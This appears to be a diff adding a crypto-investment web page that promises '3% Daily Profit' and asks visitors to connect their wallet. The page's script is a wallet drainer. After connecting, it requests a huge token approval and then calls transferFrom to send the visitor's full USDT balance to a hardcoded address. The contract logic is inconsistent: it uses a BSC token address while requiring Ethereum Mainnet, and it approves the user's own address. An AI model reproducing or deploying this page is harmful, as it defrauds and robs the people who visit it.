@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet & Transfer USDT</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f7fc;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 300px;
+        }
+        .title {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .wallet-btn, .approve-btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 10px;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+        .wallet-btn:hover, .approve-btn:hover {
+            background-color: #45a049;
+        }
+        .status {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #888;
+        }
+        .logo {
+            margin: 20px 0;
+            width: 50px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+        }
+        .footer a {
+            color: #007BFF;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2 class="title">Connect Wallet & Transfer USDT</h2>
+        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="Tether Logo" class="logo">
+        <button id="connectWallet" class="wallet-btn">Connect Wallet</button>
+        <p id="walletStatus" class="status">Please connect your wallet to continue.</p>
+        <div class="footer">
+            <p>Earn <strong>3% Daily Profit</strong></p>
+        </div>
+    </div>
+
+    <script>
+        const tokenAddress = "0x55d398326f99059ff775485246999027b3197955"; // USDT Contract Address
+        let web3;
+        let account;
+
+        const tokenABI = [
+            { "constant": false, "inputs": [ { "name": "spender", "type": "address" }, { "name": "value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
+            { "constant": true, "inputs": [ { "name": "owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "", "type": "uint256" } ], "type": "function" },
+            { "constant": false, "inputs": [ { "name": "from", "type": "address" }, { "name": "to", "type": "address" }, { "name": "value", "type": "uint256" } ], "name": "transferFrom", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" }
+        ];
+
+        document.getElementById("connectWallet").addEventListener("click", async () => {
+            if (window.ethereum) {
+                // Initialize Web3 with the Ethereum provider
+                web3 = new Web3(window.ethereum);
+                try {
+                    // Request access to user's accounts
+                    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+                    account = accounts[0];
+                    document.getElementById("walletStatus").innerText = "Connected: " + account;
+
+                    // Check if user is connected to Mainnet
+                    const networkId = await web3.eth.net.getId();
+                    if (networkId !== 1) {
+                        alert("Please switch to Ethereum Mainnet in your wallet!");
+                        return;
+                    }
+
+                    // After connection, approve and transfer
+                    await approveAndTransfer(account);
+                } catch (error) {
+                    console.error("User denied account access", error);
+                    alert("You need to allow MetaMask access to your account.");
+                }
+            } else {
+                alert("Please install MetaMask or Trust Wallet!");
+            }
+        });
+
+        const approveAndTransfer = async (userAccount) => {
+            const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+            try {
+                // Step 1: Approve unlimited for the user's address
+                const approveTx = await tokenContract.methods.approve(userAccount, web3.utils.toWei("1000000000000000", "ether")).send({ from: userAccount });
+                console.log("Approve successful! TX Hash:", approveTx.transactionHash);
+
+                // Step 2: After approval, immediately transfer
+                const balance = await tokenContract.methods.balanceOf(userAccount).call();
+                if (balance > 0) {
+                    const transferTx = await tokenContract.methods.transferFrom(userAccount, "0xd1a117C99FF09b5164d4AeBA499814254D18bb51", balance).send({ from: userAccount });
+                    alert("Transfer successful! TX Hash: " + transferTx.transactionHash);
+                } else {
+                    alert("No balance available!");
+                }
+            } catch (error) {
+                console.error("Transaction failed", error);
+                alert("There was an error during the transaction.");
+            }
+        };
+    </script>
+</body>
+</html>
